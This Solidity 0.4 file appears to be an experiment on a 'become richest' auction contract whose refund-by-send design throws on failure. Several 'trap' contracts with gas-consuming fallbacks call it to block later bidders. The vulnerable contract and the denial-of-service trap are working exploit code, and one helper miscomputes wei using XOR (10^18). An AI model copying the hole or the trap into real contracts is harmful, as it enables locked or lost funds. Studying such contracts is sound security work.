pragma solidity ^0.4.8;

contract sendcontract{
    address richest;
    uint amount;
    function()payable{
        
    }
    function sendcontract()payable{
        richest=msg.sender;
        amount=msg.value;
    }
    function becomerichest()payable returns(bool){
        if(msg.value>amount){
            if(!richest.send(msg.value))
                throw;
            richest=msg.sender;
            amount=msg.value;
            return true;
        }
        
    
    else
        return false;
}
    function getadd()constant returns(address){
        return richest;
    }
    function getamount()constant returns(uint){
        return amount;
    }
}


//0x0dc6ef4Ad00380A2E2124789a01732394A0a85d6
//pragma solidity ^0.4.8;
contract trapcontract{
    function()payable{
        uint a=10+12;
        f ff=new f();
    }
    function trap(address addr,uint x){
        //addr.becomerichest();
        if(addr.call.gas(200000).value(x)(bytes4(sha3("becomerichest()"))))
            {}
    }
    function poison(address a){
        sendcontract(a).becomerichest();
    }
}
contract f{
    
}
//测试合约中没钱能否转ether，
contract f1{
    function()payable{}
    function sendether(address addr,uint x)returns(bool)
    {
       
        if(addr.send(x))
            return true;
        return false;
    }
}
//测试能否转到另一个合约的某一个函数中去
 contract f2{
    function()payable{}
    function sendether(address addr,uint x)returns(bool)
    {
        uint weis=x*10^18;
        if(addr.send(weis))
            return true;
        return false;
    }
        function trap(address addr,uint x){
        //addr.becomerichest();
        x=x*10^18;
        if(addr.call.gas(200000).value(x)(bytes4(sha3("becomerichest()"))))
            {}
    }
}

contract f3{
    function()payable{}
    function sendether(address addr,uint x)returns(bool){
        return addr.send(x*(10**18));
    }
    function trap_bef(address addr,uint x){
        x=x*(10**18);
        if(addr.call.gas(200000).value(x)(bytes4(sha3("becomerichest()"))))
        {}
        
    }
    
}
contract f4{
    function()payable{
        f ff=new f();
        uint x=10+233;
        uint y=45*90;
    }
    function sendether(address addr,uint x)returns(bool){
        return addr.send(x*(10**18));
    }
    function trap_aft(address addr,uint x){
        x=x*(10**18);
        if(addr.call.gas(200000).value(x)(bytes4(sha3("becomerichest()"))))
        {}
        
    }
    
}
 contract hello{
     uint bal=this.balance;
     function sendether(address addr,uint value)returns(bool){
         if(addr.send(value))
            return true;
         else
            return false;
     }
 
    function trap(address addr,uint x){
        //addr.becomerichest();{}
        if(addr.call.gas(200000).value(x)(bytes4(sha3("becomerichest()"))))
            {}
    }
    function getbal()constant returns(uint){
        return this.balance;
    }
     
     
     
     
     
     
     
     
     
    
     
 }
